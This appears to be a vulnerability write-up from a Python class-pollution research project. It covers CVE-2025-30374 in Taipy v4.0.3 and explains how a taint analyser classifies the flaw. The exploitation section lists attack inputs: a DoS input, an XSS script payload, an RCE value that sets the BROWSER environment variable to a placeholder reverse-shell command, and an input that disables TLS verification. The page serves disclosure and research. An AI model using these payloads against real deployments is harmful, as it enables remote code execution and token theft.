---
title: "Taipy"
weight: 3
---

# Taipy (CVE-2025-30374)

**Taipy** is a popular Python framework for building data applications (19.2K stars), widely used in ML/AI workflows.

| Field | Value |
|-------|-------|
| Repository | [Avaiga/taipy](https://github.com/Avaiga/taipy) |
| Version | v4.0.3 |
| CVE | CVE-2025-30374 |
| Type | Constrained-Get × Attr-Set |
| Input | Remote (WebSocket) |
| Status | Fixed |

## Vulnerability

The vulnerability lies in `_attrsetter` in `taipy/gui/utils/_attributes.py`, which processes client update requests via WebSocket:

```python
def _attrsetter(obj: object, attr_str: str, value: object) -> None:
    var_name_split = attr_str.split(sep=".")
    for i in range(len(var_name_split) - 1):
        sub_name = var_name_split[i]
        obj = getattr(obj, sub_name)        # Constrained: getattr only
    setattr(obj, var_name_split[-1], value)  # Attr-Set only
```

The function:
1. Splits the attacker-controlled `attr_str` by dots
2. Resolves each segment via `getattr` (Constrained-Get)
3. Sets the final attribute with `setattr` (Attr-Set)

No validation is performed on the attribute path.

## Detection by Pyrl

Pyrl tracks the taint from WebSocket input:

1. `attr_str` and `value` parameters carry `T_INPUT`
2. After `split(".")` → `var_name_split` is `T_ENUM`
3. Loop iteration → each `sub_name` is `T_KEY`
4. `getattr(obj, sub_name)` → `T_OBJ` with `G_ATTR`
5. Since only `getattr` is used (no item access branch) → **Constrained-Get**
6. `setattr` sink → **Attr-Set**

Classification: **Constrained-Get × Attr-Set**

## Exploitation

### DoS

```
attr_str: __class__.__getattribute__
value: "crash"
```

### XSS

Via the same BeautifulSoup entity map technique as django-unicorn:
```
attr_str: __class__.__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<
value: <script>alert(1)</script>
```

### RCE

Via environment variable pollution:
```
attr_str: __class__.__init__.__globals__.sys.modules.os.environ.BROWSER
value: /bin/sh -c 'reverse_shell_command'
```

### Token Leakage

Via disabling SSL verification or redirecting API calls:
```
attr_str: __class__.__init__.__globals__.sys.modules.os.environ.REQUESTS_CA_BUNDLE
value: /dev/null
```

## Impact

Taipy is used in production ML pipelines and data applications. The WebSocket endpoint is accessible to any authenticated user, making this a remote-triggerable vulnerability with severe consequences. Taipy Enterprise promptly patched the issue after responsible disclosure.

## Proof of Concept

See [`cp-collection/taipy/poc/`](https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/taipy/poc) for the full exploit.
